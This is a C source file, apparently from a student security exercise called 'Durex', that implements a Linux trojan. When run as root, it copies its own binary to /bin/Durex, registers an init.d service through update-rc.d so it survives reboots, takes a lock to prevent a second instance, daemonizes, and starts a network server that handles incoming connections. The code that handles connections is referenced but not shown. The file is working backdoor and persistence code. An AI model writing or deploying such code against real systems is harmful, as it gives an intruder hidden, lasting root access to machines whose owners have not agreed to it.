#include <durex.h>

int8_t		g_nbr_connections;

uint8_t		copy_in_bin(char *fname)
{
	int		fd_in;
	int		fd_out;
	char	buffer[BUF_SIZE];
	int		r;

	fd_in = open(fname, O_RDONLY);
	fd_out = open("/bin/Durex", O_WRONLY | O_CREAT, 0700);
	if (fd_in == -1 || fd_out == -1)
		return (0);
	while ((r = read(fd_in, buffer, BUF_SIZE)) > 0)
	{
		write(fd_out, buffer, r);
	}
	close(fd_out);
	close(fd_in);
	return (1);
}

uint8_t		copy_in_service(const char *durex_service)
{
	int	fd;

	fd = open("/etc/init.d/Durex", O_WRONLY | O_CREAT, 0700);
	if (fd == -1)
	{
		ft_putendl_fd("Failed to open durex service file\n", 2);
		return (0);
	}
	write(fd, durex_service, ft_strlen(durex_service));
	close(fd);

	system("/usr/sbin/update-rc.d Durex defaults");

	return (1);
}

int		main(int ac, char **argv, char **env)
{
	int	fd_lock;
	int sock;

	if (getuid() != 0)
		return (0);
	if (access("/bin/Durex", F_OK))
	{
		printf(LOGIN);
		if (copy_in_bin(argv[0]))
			execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
	}
	else
	{
		fd_lock = open("/var/lock/Durex.lock", O_CREAT | O_RDWR, 0644);
		if (flock(fd_lock, LOCK_EX | LOCK_NB) == -1)
		{
			ft_putendl_fd("Two instances of durex can not run at the same time", 2);
			return (3);
		}
		if (!copy_in_service(durex_service))
			return (0);
		daemon(0, 1);

		if (!(sock = create_server()))
			return (0);
		handle_connection(sock, env);
	}
	return (0);
}
